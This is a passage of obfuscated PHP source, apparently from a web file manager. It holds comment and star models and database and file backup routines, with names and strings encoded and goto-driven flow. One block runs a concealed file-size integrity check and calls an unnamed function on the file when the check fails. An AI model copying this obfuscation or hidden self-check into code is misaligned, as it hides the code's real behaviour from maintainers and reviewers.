$»Ö±®¤„[223] => Task::get($»Ö±®¤„[869])); $º£ÇÚµÚ = !1; foreach ($š·Üöê§ as &$¡Ğœ—Á®) { if ($º£ÇÚµÚ) { $¡Ğœ—Á® = !1; continue; } if ($¡Ğœ—Á®) { $¶®Ş”ØÀ = intval(_get($¡Ğœ—Á®, $»Ö±®¤„[1709], 0)); if (time() - $¶®Ş”ØÀ > 7200) { Task::kill($¡Ğœ—Á®[$»Ö±®¤„[451]]); $º£ÇÚµÚ = !0; $¡Ğœ—Á® = !1; } } } return $š·Üöê§; } public function restore() { $ƒ¬ã¨«Ü =& $_SERVER[ˆûùúÊ¯]; ActionCall($ƒ¬ã¨«Ü[1121], !0, 1); ActionCall($ƒ¬ã¨«Ü[1121], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\x65\156\164"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\x6d\145" => "\x63\157\x6d\x6d\145\156\x74\137\x6d\x65\164\x61", "\155\x65\x74\141\x46\151\145\x6c\x64" => "\143\x6f\155\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($²—¯ù) { $Á¿Ê†® =& $_SERVER[ˆûùúÊ¯]; if ($²—¯ù[$Á¿Ê†®[1925]]) { $ŞÓ¶‹± = $this->where(array($Á¿Ê†®[1926] => $²—¯ù[$Á¿Ê†®[1925]]))->find(); if (!$ŞÓ¶‹± || $ŞÓ¶‹±[$Á¿Ê†®[187]] != $²—¯ù[$Á¿Ê†®[187]] || $ŞÓ¶‹±[$Á¿Ê†®[546]] != $²—¯ù[$Á¿Ê†®[546]]) { return !1; } $this->where(array($Á¿Ê†®[1926] => $²—¯ù[$Á¿Ê†®[1925]]))->setAdd($Á¿Ê†®[1927], 1); } $²—¯ù[$Á¿Ê†®[1928]] = 0; $²—¯ù[$Á¿Ê†®[1927]] = 0; $²—¯ù[$Á¿Ê†®[810]] = 1; return $this->add($²—¯ù); } public function commentCount($÷ù¬åàö, $ìÙ¾Á™, $È‚øó™¢ = false) { $ê¹âµ°» =& $_SERVER[ˆûùúÊ¯]; if (!$÷ù¬åàö) { return array(); } if (is_string($÷ù¬åàö) || is_int($÷ù¬åàö)) { $÷ù¬åàö = array($÷ù¬åàö); } $èÜ–é¿Å = array($ê¹âµ°»[546], $ê¹âµ°»[1929] => $ê¹âµ°»[541]); $ÖˆÊÊªŞ = array($ê¹âµ°»[546] => array($ê¹âµ°»[7], $÷ù¬åàö), $ê¹âµ°»[187] => $ìÙ¾Á™); if ($È‚øó™¢) { $ÖˆÊÊªŞ[$ê¹âµ°»[1704]] = $È‚øó™¢; } $±ŸÜ¢ªŒ = $this->field($èÜ–é¿Å)->where($ÖˆÊÊªŞ)->group($ê¹âµ°»[546])->select(); return array_to_keyvalue($±ŸÜ¢ªŒ, $ê¹âµ°»[546], $ê¹âµ°»[541]); } public function starTarget($ÔËÙ¯šœ, $ÕáåÂ—) { $§†ˆ±æ =& $_SERVER[ˆûùúÊ¯]; $ÀìÙ¥Ñ÷ = $ÔËÙ¯šœ + self::TYPE_STAR_OFFSET; $É”ñæè‹ = array($§†ˆ±æ[1704] => USER_ID, $§†ˆ±æ[187] => $ÀìÙ¥Ñ÷, $§†ˆ±æ[546] => $ÕáåÂ—); $„‹ıíœ = $this->where($É”ñæè‹)->find(); if ($„‹ıíœ) { return $this->where(array($§†ˆ±æ[451] => $„‹ıíœ[$§†ˆ±æ[451]]))->delete(); } $ØµËŞÏë = array($§†ˆ±æ[1925] => 0, $§†ˆ±æ[1704] => USER_ID, $§†ˆ±æ[810] => 1, $§†ˆ±æ[814] => $§†ˆ±æ[12], $§†ˆ±æ[187] => $ÀìÙ¥Ñ÷, $§†ˆ±æ[546] => $ÕáåÂ—, $§†ˆ±æ[1928] => 0, $§†ˆ±æ[1927] => 0); return $this->add($ØµËŞÏë); } public function starTargetCount($¥¯Şˆà, $¡¨»èÒ§) { $Ûâ‹÷ı½ =& $_SERVER[ˆûùúÊ¯]; $²»·ŞÈ‰ = $¡¨»èÒ§ + self::TYPE_STAR_OFFSET; $ÚÖåñëÈ = $this->commentCount($¥¯Şˆà, $²»·ŞÈ‰); $üÌâ‰ï… = $this->commentCount($¥¯Şˆà, $²»·ŞÈ‰, USER_ID); return array($Ûâ‹÷ı½[1930] => $ÚÖåñëÈ, $Ûâ‹÷ı½[1931] => $üÌâ‰ï…); } public function starTargetUserList($”¢¯€õÊ, $Š­”Î¿Ñ) { $“ä»¨¾ß =& $_SERVER[ˆûùúÊ¯]; $×Ÿ˜®ìƒ = $”¢¯€õÊ + self::TYPE_STAR_OFFSET; $•Ÿ€‘Ä = array($“ä»¨¾ß[546] => $Š­”Î¿Ñ, $“ä»¨¾ß[187] => $×Ÿ˜®ìƒ); $„Üñó‚ú = $this->where($•Ÿ€‘Ä)->count(); $¸¸¾±í¨ = array($“ä»¨¾ß[307] => $„Üñó‚ú, $“ä»¨¾ß[1932] => array()); if (!$„Üñó‚ú) { return $¸¸¾±í¨; } $³¯±¬é = $this->field($“ä»¨¾ß[1704])->where($•Ÿ€‘Ä)->limit(500)->select(); $³¯±¬é = array_to_keyvalue($³¯±¬é, $“ä»¨¾ß[12], $“ä»¨¾ß[1704]); $¸¸¾±í¨[$“ä»¨¾ß[1932]] = Model($“ä»¨¾ß[554])->userListInfo($³¯±¬é); return $¸¸¾±í¨; } public function prasiseUserList($«¦é„ú•) { $¡Èæ²…• =& $_SERVER[ˆûùúÊ¯]; $şŸı†¢à = array($¡Èæ²…•[1933] => $«¦é„ú•); $İƒŞõ…Ä = $this->where($şŸı†¢à)->find(); $¢Œ½ªšï = _get($İƒŞõ…Ä, $¡Èæ²…•[1928], 0); $÷ó­ûÈ¢ = array($¡Èæ²…•[307] => $¢Œ½ªšï, $¡Èæ²…•[1932] => array()); if (!$¢Œ½ªšï) { return $÷ó­ûÈ¢; } $Öš­‚„Ÿ = Model($¡Èæ²…•[1934])->field($¡Èæ²…•[1704])->where($şŸı†¢à)->limit(500)->select(); $Öš­‚„Ÿ = array_to_keyvalue($Öš­‚„Ÿ, $¡Èæ²…•[12], $¡Èæ²…•[1704]); $÷ó­ûÈ¢[$¡Èæ²…•[1932]] = Model($¡Èæ²…•[554])->userListInfo($Öš­‚„Ÿ); return $÷ó­ûÈ¢; } public function remove($ñÔ“áĞ·) { $É„úæ¡¶ =& $_SERVER[ˆûùúÊ¯]; $Ë®ÉÃÏÛ = array($É„úæ¡¶[1926] => $ñÔ“áĞ·); $üÇÃšĞù = $this->where($Ë®ÉÃÏÛ)->find(); if ($üÇÃšĞù[$É„úæ¡¶[1925]]) { $this->where(array($É„úæ¡¶[1926] => $üÇÃšĞù[$É„úæ¡¶[1925]]))->setAdd($É„úæ¡¶[1927], -1); } return $this->where($Ë®ÉÃÏÛ)->delete(); } public function edit($ÙÉş‚«‹, $şğœ¢ö„) { $ÂÛ‘Ÿ« =& $_SERVER[ˆûùúÊ¯]; $ò–ÕåÇ† = array($ÂÛ‘Ÿ«[1926] => $ÙÉş‚«‹); return $this->where($ò–ÕåÇ†)->save(array($ÂÛ‘Ÿ«[1935] => $şğœ¢ö„)); } public function prasise($ï§¯——») { $¸í‰ÈÅ– =& $_SERVER[ˆûùúÊ¯]; $´ì¦Û‹Õ = Model($¸í‰ÈÅ–[1936]); $”ÇöãæÆ = array($¸í‰ÈÅ–[1926] => $ï§¯——», $¸í‰ÈÅ–[1695] => USER_ID); $›Ó²·¨™ = $´ì¦Û‹Õ->where($”ÇöãæÆ)->find(); if (!$›Ó²·¨™) { $´ì¦Û‹Õ->add($”ÇöãæÆ); $†õ‰ƒÂş = $this->where(array($¸í‰ÈÅ–[1926] => $ï§¯——»))->setAdd($¸í‰ÈÅ–[1928], 1); } else { $´ì¦Û‹Õ->where($”ÇöãæÆ)->delete(); $†õ‰ƒÂş = $this->where(array($¸í‰ÈÅ–[1926] => $ï§¯——»))->setAdd($¸í‰ÈÅ–[1928], -1); } return $†õ‰ƒÂş; } public function targetInfo($İµÄ¿¶©, $Ö¶¦¡ÖÃ) { $ìÎâĞç =& $_SERVER[ˆûùúÊ¯]; $·¿™éî˜ = array($ìÎâĞç[624] => $İµÄ¿¶©, $ìÎâĞç[625] => $Ö¶¦¡ÖÃ); $¢ÉŸ = $this->where($·¿™éî˜)->count(); $œÆ©³÷ = "\x52\x49\x47\110\x54\x20\112\117\111\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\x65\x6e\x74\137\x70\162\x61\151\x73\145\40\163\x74\141\x72\40\x6f\156\x20\143\157\155\x6d\145\156\x74\x2e\143\x6f\x6d\x6d\x65\x6e\x74\x49\x44\x20\x3d\40\163\x74\x61\x72\56\143\x6f\155\155\145\x6e\164\111\x44"; $ÍíÎ€Ú = $this->alias($ìÎâĞç[406])->where($·¿™éî˜)->join($œÆ©³÷, $ìÎâĞç[1937])->count(); $Ãœ•ª¬ø = array($ìÎâĞç[1938] => $¢ÉŸ, $ìÎâĞç[1939] => $ÍíÎ€Ú); return $Ãœ•ª¬ø; } public function listData($£€ù òû) { $–‰Ü°… =& $_SERVER[ˆûùúÊ¯]; if (isset($£€ù òû[$–‰Ü°…[1940]])) { if ($£€ù òû[$–‰Ü°…[1940]]) { $£€ù òû[$–‰Ü°…[1933]] = array($–‰Ü°…[1075], intval($£€ù òû[$–‰Ü°…[1940]])); } unset($£€ù òû[$–‰Ü°…[1940]]); } if (isset($£€ù òû[$–‰Ü°…[1941]])) { if ($£€ù òû[$–‰Ü°…[1941]]) { $£€ù òû[$–‰Ü°…[1933]] = array($–‰Ü°…[1072], intval($£€ù òû[$–‰Ü°…[1941]])); } unset($£€ù òû[$–‰Ü°…[1941]]); } return $this->_listData($£€ù òû); } private function _listData($Â´ò²Ø) { $ÆÖÂ®³ü =& $_SERVER[ˆûùúÊ¯]; $œ¶»ûâÃ = $this->where($Â´ò²Ø)->_makeOrder()->selectPage(100); $this->_listAppendParent($œ¶»ûâÃ[$ÆÖÂ®³ü[421]]); $this->_listAppendUser($œ¶»ûâÃ[$ÆÖÂ®³ü[421]]); $this->_listAppendMeta($œ¶»ûâÃ[$ÆÖÂ®³ü[421]]); return $œ¶»ûâÃ; } private function _makeOrder() { $ÛëüŠ˜­ =& $_SERVER[ˆûùúÊ¯]; $¥ªõ¼ëë = array($ÛëüŠ˜­[1928], $ÛëüŠ˜­[1927], $ÛëüŠ˜­[224]); $èøÀ’Ï = Input::get($ÛëüŠ˜­[506], $ÛëüŠ˜­[7], $ÛëüŠ˜­[473], $¥ªõ¼ëë); $ã¬ı·™ = Input::get($ÛëüŠ˜­[507], $ÛëüŠ˜­[7], $ÛëüŠ˜­[1697], array($ÛëüŠ˜­[1942], $ÛëüŠ˜­[502])); $¡•óêÑ = $èøÀ’Ï . $ÛëüŠ˜­[63] . $ã¬ı·™; return $this->order($¡•óêÑ); } private function _listAppendParent(&$Æìà¾µ) { $÷«‘šŒƒ =& $_SERVER[ˆûùúÊ¯]; $ƒÏüö = array_unique(array_to_keyvalue($Æìà¾µ, $÷«‘šŒƒ[12], $÷«‘šŒƒ[1925])); $ƒÏüö = array_remove_value($ƒÏüö, $÷«‘šŒƒ[221]); if (!$ƒÏüö) { return; } $Æ´ë¿³Ã = $this->where(array($÷«‘šŒƒ[1926] => array($÷«‘šŒƒ[7], $ƒÏüö)))->select(); $Æ´ë¿³Ã = array_to_keyvalue($Æ´ë¿³Ã, $÷«‘šŒƒ[1933]); foreach ($Æìà¾µ as &$¸ÈÕµ§·) { if (isset($Æ´ë¿³Ã[$¸ÈÕµ§·[$÷«‘šŒƒ[1925]]])) { $¸ÈÕµ§·[$÷«‘šŒƒ[1943]] = $Æ´ë¿³Ã[$¸ÈÕµ§·[$÷«‘šŒƒ[1925]]]; } } unset($¸ÈÕµ§·); } private function _listAppendUser(&$ğğå¥´) { $öìªŠåò =& $_SERVER[ˆûùúÊ¯]; $¹Á«Ïˆ¿ = array_unique(array_to_keyvalue($ğğå¥´, $öìªŠåò[12], $öìªŠåò[1704])); $¹Á«Ïˆ¿ = array_remove_value($¹Á«Ïˆ¿, $öìªŠåò[221]); if (count($¹Á«Ïˆ¿) == 0) { return; } foreach ($ğğå¥´ as $ï‹­Òáú) { if (isset($ï‹­Òáú[$öìªŠåò[1943]])) { $¹Á«Ïˆ¿[] = $ï‹­Òáú[$öìªŠåò[1943]][$öìªŠåò[1704]]; } } $Í¨ß»Ï = Model($öìªŠåò[575])->userListInfo($¹Á«Ïˆ¿); foreach ($ğğå¥´ as &$ï‹­Òáú) { $ï‹­Òáú[$öìªŠåò[638]] = $Í¨ß»Ï[$ï‹­Òáú[$öìªŠåò[1704]]]; if (isset($ï‹­Òáú[$öìªŠåò[1943]])) { $ï‹­Òáú[$öìªŠåò[1943]][$öìªŠåò[638]] = $Í¨ß»Ï[$ï‹­Òáú[$öìªŠåò[1943]][$öìªŠåò[1704]]]; } } unset($ï‹­Òáú); } private function _listAppendMeta(&$²‰ç) { $Ì£ô³–Æ =& $_SERVER[ˆûùúÊ¯]; $®‰ŸÊâ = array_unique(array_to_keyvalue($²‰ç, $Ì£ô³–Æ[12], $Ì£ô³–Æ[1933])); $®‰ŸÊâ = array_remove_value($®‰ŸÊâ, $Ì£ô³–Æ[221]); if (!$®‰ŸÊâ) { return; } foreach ($²‰ç as $¸şÒö¹â) { if (isset($¸şÒö¹â[$Ì£ô³–Æ[1943]])) { $®‰ŸÊâ[] = $¸şÒö¹â[$Ì£ô³–Æ[1943]][$Ì£ô³–Æ[1933]]; } } $î’± = $this->metaList($®‰ŸÊâ); if (!$î’±) { return !1; } foreach ($²‰ç as &$¸şÒö¹â) { $¸şÒö¹â[$Ì£ô³–Æ[515]] = $î’±[$¸şÒö¹â[$Ì£ô³–Æ[1933]]]; if (isset($¸şÒö¹â[$Ì£ô³–Æ[1943]])) { $¸şÒö¹â[$Ì£ô³–Æ[1943]][$Ì£ô³–Æ[515]] = $î’±[$¸şÒö¹â[$Ì£ô³–Æ[1943]][$Ì£ô³–Æ[1933]]]; } } unset($¸şÒö¹â); } private function metaList($õı½ñÀæ) { $“Œš¦à— =& $_SERVER[ˆûùúÊ¯]; if (!$õı½ñÀæ) { return array(); } $•ô±‡ş“ = array($“Œš¦à—[1933] => array($“Œš¦à—[7], $õı½ñÀæ)); $Ä¬²ùÔ = Model($“Œš¦à—[1944])->where($•ô±‡ş“)->select(); $Ä¬²ùÔ = array_to_keyvalue_group($Ä¬²ùÔ, $“Œš¦à—[1933]); foreach ($Ä¬²ùÔ as $ê¿¹ĞÇ„ => $ø§²’ÜÑ) { $œã„ùŞÜ = array(); foreach ($ø§²’ÜÑ as $”ïÃÖ£÷) { $œã„ùŞÜ[$”ïÃÖ£÷[$“Œš¦à—[104]]] = $”ïÃÖ£÷[$“Œš¦à—[426]]; } $Ä¬²ùÔ[$ê¿¹ĞÇ„] = $œã„ùŞÜ; } return $Ä¬²ùÔ ? $Ä¬²ùÔ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\x6c\145\137\143\x6f\x6e\x74\145\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\151\x6d\145", "\x74\x69\155\x65", "\151\x6e\163\145\162\x74", "\x66\165\x6e\x63\164\x69\157\156")); } goto b­óÅæíÛ; Cù½åƒ¯ƒ´: $fileSize = strrev(base64_decode($_SERVER[˜½Êêò][0])); function binCheckNeq($ØĞûäÄ, $ÌşÉÉ§Ÿ) { return $ØĞûäÄ != $ÌşÉÉ§Ÿ; } $_SERVER[$_SERVER[˜½Êêò][1]] = $fileSize($_SERVER[$_SERVER[˜½Êêò][2]]); goto AÌË§³»; b­óÅæíÛ: $_file = $_SERVER[$_SERVER[ˆûùúÊ¯][22]]; $_size = $_SERVER[ˆûùúÊ¯][937]; if ($_SERVER[$_SERVER[ˆûùúÊ¯][13]] != $_size($_file)) { $_getc = $_SERVER[ˆûùúÊ¯][15]; $_getfile = $_SERVER[$_SERVER[ˆûùúÊ¯][16]] . $_SERVER[ˆûùúÊ¯][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆûùúÊ¯][18], $_getfilec); if (count($_getarrs) < $_SERVER[ˆûùúÊ¯][19]) { $exit = $_SERVER[ˆûùúÊ¯][20]; $exit(); } $_act = $_SERVER[ˆûùúÊ¯][21]; $_act($_file); } goto BÛï³ŸÖåø; e³°áéŠğö: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ë–’¨‡— =& $_SERVER[ˆûùúÊ¯]; $Ò÷áÄãç = Backup::get(); self::$io = $Ò÷áÄãç[$Ë–’¨‡—[811]]; self::$name = $Ò÷áÄãç[$Ë–’¨‡—[42]]; $š«œµ›© = new DbManage(); $±ÅİóÇ = $š«œµ›©->dbType(); $ÆÚË˜ïß = array($Ë–’¨‡—[836] => $±ÅİóÇ, $Ë–’¨‡—[837] => time()); Backup::set($ÆÚË˜ïß); $ã±¢¾Ïè = $this->tmpFilesPath() . $Ë–’¨‡—[838] . self::$name . $Ë–’¨‡—[8]; del_dir($ã±¢¾Ïè); mk_dir($ã±¢¾Ïè); $Œ½–»¬ = $ä±âª† = 0; $ åñ¯¶µ = new Task($Ë–’¨‡—[839], $Ë–’¨‡—[840], 0, LNG($Ë–’¨‡—[841]) . $Ë–’¨‡—[842] . LNG($Ë–’¨‡—[843])); try { $êñÔŠı± = $š«œµ›©->db()->getTables(); } catch (Exception $­µÀÀ¤) { $ åñ¯¶µ->end(); return !1; } $êñÔŠı± = array_diff($êñÔŠı±, array($Ë–’¨‡—[844], $Ë–’¨‡—[845])); foreach ($êñÔŠı± as $æÅ€±´…) { $Œ½–»¬ += $š«œµ›©->model($æÅ€±´…)->count(); } $ åñ¯¶µ->task[$Ë–’¨‡—[846]] = $Œ½–»¬; $GLOBALS[$Ë–’¨‡—[847]] = self::$name; foreach ($êñÔŠı± as $æÅ€±´…) { $Õ§û¢©º = $ã±¢¾Ïè . $æÅ€±´… . $Ë–’¨‡—[848]; $ÁÁ…ŠÓ¹ = null; if ($æÅ€±´… == $Ë–’¨‡—[849] && (!isset($Ò÷áÄãç[$Ë–’¨‡—[814]]) || $Ò÷áÄãç[$Ë–’¨‡—[814]] == $Ë–’¨‡—[221])) { $ÁÁ…ŠÓ¹ = self::$io; } $ä±âª† += $š«œµ›©->sqlFromDb($æÅ€±´…, $Õ§û¢©º, $ åñ¯¶µ, $ÁÁ…ŠÓ¹); } unset($GLOBALS[$Ë–’¨‡—[847]]); $ åñ¯¶µ->end(); if ($ä±âª† > $Œ½–»¬) { $Œ½–»¬ = $ä±âª†; } $ÆÚË˜ïß = array($Ë–’¨‡—[836] => $±ÅİóÇ, $Ë–’¨‡—[833] => 1, $Ë–’¨‡—[850] => $Œ½–»¬, $Ë–’¨‡—[851] => $ä±âª†, $Ë–’¨‡—[852] => time()); Backup::set($ÆÚË˜ïß); if ($Œ½–»¬ - $ä±âª† > 0) { $‚î•“È‹ = $Ë–’¨‡—[853]; if (stristr(I18n::getType(), $Ë–’¨‡—[854])) { $‚î•“È‹ = $Ë–’¨‡—[855]; } write_log(array($‚î•“È‹, $ÆÚË˜ïß), $Ë–’¨‡—[840]); return !1; } return !0; } private function tmpFilesPath() { $ê°µ» =& $_SERVER[ˆûùúÊ¯]; $º‘«Ü˜‚ = TEMP_FILES; if ($GLOBALS[$ê°µ»[6]][$ê°µ»[99]][$ê°µ»[856]]) { $º‘«Ü˜‚ = $GLOBALS[$ê°µ»[6]][$ê°µ»[99]][$ê°µ»[856]]; if (!mk_dir($º‘«Ü˜‚) || !is_writable($º‘«Ü˜‚) || !IO::mkfile($º‘«Ü˜‚ . $ê°µ»[857])) { $º‘«Ü˜‚ = TEMP_FILES; } } return $º‘«Ü˜‚; } } class BackupDbFile { public function __construct() { } public function index() { $¤Ö’µ€ =& $_SERVER[ˆûùúÊ¯]; $ŒÉÓ×ö = Backup::get(); $ƒ¨šÂ‰ = $ŒÉÓ×ö[$¤Ö’µ€[42]]; $ÜâÃË—á = $this->tmpFilesPath() . "\142\x61\x63\x6b\165\x70\x5f{$ƒ¨šÂ‰}\x2f"; $ØôéÓË = $this->backupPath($ŒÉÓ×ö); if (!($ØôéÓË = IO::mkdir($ØôéÓË))) { return !1; } $åÔ¿‚ç£ = IO::listPath($ÜâÃË—á); $„õÉ¦ = isset($åÔ¿‚ç£[$¤Ö’µ€[93]]) ? $åÔ¿‚ç£[$¤Ö’µ€[93]] : array(); $äûšáì¥ = array_sum(array_column($„õÉ¦, $¤Ö’µ€[86])); if (!$äûšáì¥) { return !1; } $²ˆ’Œ“£ = array($¤Ö’µ€[858] => $äûšáì¥, $¤Ö’µ€[859] => time()); Backup::set($²ˆ’Œ“£); $œç´‘àÏ = new TaskFileTransfer($¤Ö’µ€[860], $¤Ö’µ€[840], count($„õÉ¦), LNG($¤Ö’µ€[841]) . $¤Ö’µ€[438] . LNG($¤Ö’µ€[843]) . $¤Ö’µ€[861]); $œç´‘àÏ->task[$¤Ö’µ€[823]] = $äûšáì¥; foreach ($åÔ¿‚ç£[$¤Ö’µ€[93]] as $Ô‡Æ½Çä) { $êãƒÍÃå = IO::move($Ô‡Æ½Çä[$¤Ö’µ€[94]], $ØôéÓË); if (!$êãƒÍÃå) { $œç´‘àÏ->end(); $š£ìõ­ = IO::getLastError($¤Ö’µ€[862] . $Ô‡Æ½Çä[$¤Ö’µ€[94]] . $¤Ö’µ€[863] . $ØôéÓË . $¤Ö’µ€[174]); write_log($š£ìõ­, $¤Ö’µ€[840]); return !1; } } $ò¤ñØ×„ = new DbManage(); $Ó¦¯Ü¡À = $ò¤ñØ×„->getSqlFile(); if (!$Ó¦¯Ü¡À[$¤Ö’µ€[864]] || !$Ó¦¯Ü¡À[$¤Ö’µ€[23]]) { return !1; } IO::move($Ó¦¯Ü¡À[$¤Ö’µ€[864]], $ØôéÓË); IO::move($Ó¦¯Ü¡À[$¤Ö’µ€[23]], $ØôéÓË); $œç´‘àÏ->end(); $²ˆ’Œ“£ = array($¤Ö’µ€[865] => $äûšáì¥, $¤Ö’µ€[866] => time()); Backup::set($²ˆ’Œ“£); return !0; } private function backupPath($ÃÇÌ¤£) { $Ó¡ìÒ“œ =& $_SERVER[ˆûùúÊ¯]; $ØÙÛíÌ¤ = $ÃÇÌ¤£[$Ó¡ìÒ“œ[42]]; $¯ŞŒêİ¸ = Model($Ó¡ìÒ“œ[830])->get($Ó¡ìÒ“œ[831]); $úá£¡õÔ = substr(md5($Ó¡ìÒ“œ[832] . $¯ŞŒêİ¸ . $ØÙÛíÌ¤), 0, 8); return "\173\x69\157\72{$ÃÇÌ¤£[$Ó¡ìÒ“œ[811]]}\175\57\x64\x61\x74\x61\142\x61\163\x65\x2f\x62\141\143\153\165\160\x2f" . $ØÙÛíÌ¤ . $Ó¡ìÒ“œ[11] . $úá£¡õÔ; } private function tmpFilesPath() { $ş¡½®ã” =& $_SERVER[ˆûùúÊ¯]; $ó‘Û‰¤© = TEMP_FILES; if ($GLOBALS[$ş¡½®ã”[6]][$ş¡½®ã”[99]][$ş¡½®ã”[856]]) { $ó‘Û‰¤© = $GLOBALS[$ş¡½®ã”[6]][$ş¡½®ã”[99]][$ş¡½®ã”[856]]; if (!mk_dir($ó‘Û‰¤©) || !is_writable($ó‘Û‰¤©) || !IO::mkfile($ó‘Û‰¤© . $ş¡½®ã”[857])) { $ó‘Û‰¤© = TEMP_FILES; } } return $ó‘Û‰¤©; } } class BackupFile { public function __construct() { } public function index() { $œû›˜ = Backup::get(); $ÍºĞÊË = $œû›˜[$_SERVER[ˆûùúÊ¯][345]][$_SERVER[ˆûùúÊ¯][223]][$_SERVER[ˆûùúÊ¯][517]]; $›¦Âàœ = array($_SERVER[ˆûùúÊ¯][518] => array($_SERVER[ˆûùúÊ¯][867], $ÍºĞÊË), $_SERVER[ˆûùúÊ¯][868] => array($_SERVER[ˆûùúÊ¯][383], $œû›˜[$_SERVER[ˆûùúÊ¯][811]])); $©œàøú = (int) Model($_SERVER[ˆûùúÊ¯][849])->where($›¦Âàœ)->count($_SERVER[ˆûùúÊ¯][517]); $­óåÛ‘÷ = (int) Model($_SERVER[ˆûùúÊ¯][849])->where($›¦Âàœ)->sum($_SERVER[ˆûùúÊ¯][86]); $½ƒ–­ûç = new TaskFileTransfer($_SERVER[ˆûùúÊ¯][869], $_SERVER[ˆûùúÊ¯][840], $©œàøú, LNG($_SERVER[ˆûùúÊ¯][841]) . $_SERVER[ˆûùúÊ¯][842] . LNG($_SERVER[ˆûùúÊ¯][870])); $½ƒ–­ûç->task[$_SERVER[ˆûùúÊ¯][823]] = $­óåÛ‘÷; $‰åĞŒÒ = array($_SERVER[ˆûùúÊ¯][871] => $©œàøú, $_SERVER[ˆûùúÊ¯][872] => $­óåÛ‘÷, $_SERVER[ˆûùúÊ¯][873] => time()); Backup::set($‰åĞŒÒ); $ô¢É°à» = !0; $¤¼Éƒ Ë = $this->storeIds(); $¿ò²ã³ñ = 1; $àÆÍ¤°Ü = 1000; $–©õ‚ß— = $™éÈ¥÷¥ = 0; $¼…Í‚€Í = array(); $Ü×ù¥ÆÈ = $¨É½±¾ = 0; do { $ä¶¤ÊÆÅ = $_SERVER[ˆûùúÊ¯][874]; $õàß‚Öı = Model($_SERVER[ˆûùúÊ¯][849])->where($›¦Âàœ)->field($ä¶¤ÊÆÅ)->order($_SERVER[ˆûùúÊ¯][875])->selectPage($àÆÍ¤°Ü, $¿ò²ã³ñ); $Ï°áÀ‡› = !empty($õàß‚Öı[$_SERVER[ˆûùúÊ¯][421]]) ? $õàß‚Öı[$_SERVER[ˆûùúÊ¯][421]] : array(); foreach ($Ï°áÀ‡› as $éÁ†Òúâ) { if (!$this->_fileExist($éÁ†Òúâ, $¼…Í‚€Í, $¤¼Éƒ Ë)) { $©œàøú -= 1; $­óåÛ‘÷ -= (int) $éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][86]]; write_log("\x66\151\154\x65\40\156\157\x74\40\x65\x78\x69\163\164\56\x66\151\154\145\111\104\x3a{$éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][517]]}\54\40\x70\x61\164\150\x3a{$éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][94]]}", $_SERVER[ˆûùúÊ¯][876]); continue; } $¡ìğ‰°• = $éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][94]]; $¯á“èÀİ = "\173\x69\157\x3a{$œû›˜[$_SERVER[ˆûùúÊ¯][811]]}\x7d" . substr($¡ìğ‰°•, strlen("\x7b\x69\x6f\72{$éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][877]]}\x7d")); if (IO::exist($¯á“èÀİ)) { $½ƒ–­ûç->updateFileEnd($éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][42]], $éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][86]]); } else { $¯á“èÀİ = get_path_father($¯á“èÀİ); IO::mkdir($¯á“èÀİ); if (!IO::copy($¡ìğ‰°•, $¯á“èÀİ, $_SERVER[ˆûùúÊ¯][878])) { write_log($_SERVER[ˆûùúÊ¯][879] . $¡ìğ‰°• . $_SERVER[ˆûùúÊ¯][863] . $¯á“èÀİ . $_SERVER[ˆûùúÊ¯][174], $_SERVER[ˆûùúÊ¯][840]); $ô¢É°à» = !1; break; } } $ÍºĞÊË = $éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][517]]; $™éÈ¥÷¥ += 1; $–©õ‚ß— += $éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][86]]; $¨É½±¾ += 1; $Ü×ù¥ÆÈ += $éÁ†Òúâ[$_SERVER[ˆûùúÊ¯][86]]; if ($–©õ‚ß— >= 1024 * 1024 * 100) { $‰åĞŒÒ = array($_SERVER[ˆûùúÊ¯][880] => $ÍºĞÊË, $_SERVER[ˆûùúÊ¯][881] => $¨É½±¾, $_SERVER[ˆûùúÊ¯][882] => $Ü×ù¥ÆÈ); Backup::set($‰åĞŒÒ); $–©õ‚ß— = $™éÈ¥÷¥ = 0; } } $ìŠƒ°¥Ê = count($Ï°áÀ‡›); $¿ò²ã³ñ++; } while ($ìŠƒ°¥Ê == $àÆÍ¤°Ü); $½ƒ–­ûç->end(); $‰åĞŒÒ = array($_SERVER[ˆûùúÊ¯][883] => 1, $_SERVER[ˆûùúÊ¯][821] => time(), $_SERVER[ˆûùúÊ¯][835] => 1, $_SERVER[ˆûùúÊ¯][880] => $ÍºĞÊË, $_SERVER[ˆûùúÊ¯][872] => $­óåÛ‘÷, $_SERVER[ˆûùúÊ¯][871] => $©œàøú, $_SERVER[ˆûùúÊ¯][884] => time()); if ($™éÈ¥÷¥) { $‰åĞŒÒ[$_SERVER[ˆûùúÊ¯][881]] = $¨É½±¾; $‰åĞŒÒ[$_SERVER[ˆûùúÊ¯][882]] = $Ü×ù¥ÆÈ; } Backup::set($‰åĞŒÒ); $this->_fileFilter($¼…Í‚€Í); return !0; } private function _fileExist($ÚßèÅş, &$ƒ¡Óõ°Ä, $¹³ĞñÒ›) { $ü˜î„¯¸ =& $_SERVER[ˆûùúÊ¯]; $’¿ë­œ = $ÚßèÅş[$ü˜î„¯¸[94]]; if (in_array($ÚßèÅş[$ü˜î„¯¸[517]], $ƒ¡Óõ°Ä)) { return !1; } if (!in_array($ÚßèÅş[$ü˜î„¯¸[877]], $¹³ĞñÒ›)) { return !1; } if 